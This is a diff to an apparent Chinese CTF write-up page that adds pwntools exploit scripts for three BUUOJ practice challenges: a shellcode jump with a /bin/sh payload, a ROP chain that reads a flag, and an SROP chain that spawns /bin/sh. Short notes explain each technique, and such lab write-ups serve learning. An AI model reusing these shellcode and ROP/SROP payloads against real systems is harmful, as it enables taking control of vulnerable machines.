@@ -79,8 +79,6 @@ icon: icon-html
   r.interactive()
   ```
 
-  
-
 * ### pwn1_sctf_2016
 
   ```python
@@ -268,7 +266,82 @@ icon: icon-html
 
   略
 
+* ### ez_pz_hackover_2016
 
+  地址白给，跳shellcode
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20040)
+  shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+  r.recvuntil("Yippie, lets crash:")
+  fuck_addr = int(r.recvline().strip(), 16)
+  r.recvuntil('>')
+  payload = 'crashme\x00' + '\x90'*0x12 + p32(fuck_addr) + '\x90'*0x100 + shellcode
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+* ### not_the_same_3dsctf_2016
+
+  白给函数读flag
+
+  ```
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20007)
+  context.log_level = 'debug'
+  fuck = 0x80489a0
+  flag = 0x80eca2d
+  write = 0x806e270
+  payload = 'a'*0x2d + p32(fuck)+p32(write)+p32(main)+p32(1)+p32(flag)+p32(100)
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+* ###  ciscn_2019_s_3
+
+  只有read和write
+
+  有个叫gadgets的白给函数，返回15
+
+  rax为15，对应的系统调用为__NR_rt_sigreturn 
+
+  SROP
+
+  找一波gadgets，调用write找个地方写/bin/sh，然后在那溢出跑execve("/bin/sh",0,0)
+
+  ```p&#39;y&#39;t
+  from pwn import *
+  r = remote('pwn.buuoj.cn', 20154)
+  context.arch = 'amd64'
+  syscall_ret = 0x400517
+  mov_rax_15 = 0x4004DA
+  sigreturn = p64(mov_rax_15) + p64(syscall_ret)
+  
+  fuck = SigreturnFrame()
+  fuck.rdi = 0
+  fuck.rsi = 0x601000
+  fuck.rdx = 1000
+  fuck.rax = 0
+  fuck.rsp = 0x601050
+  fuck.rip = syscall_ret
+  payload = 'a'*0x10 + sigreturn + str(fuck)
+  r.sendline(payload)
+  
+  wdnmd = SigreturnFrame()
+  wdnmd.rdi = 0x601000
+  wdnmd.rsi = 0
+  wdnmd.rdx = 0
+  wdnmd.rax = 59
+  wdnmd.rsp = 0x601050
+  wdnmd.rip = syscall_ret
+  payload = '/bin/sh'.ljust(0x50,'\x00')+sigreturn+str(wdnmd)
+  r.sendline(payload)
+  
+  r.interactive()
+  ```
+
+  
 
 
 
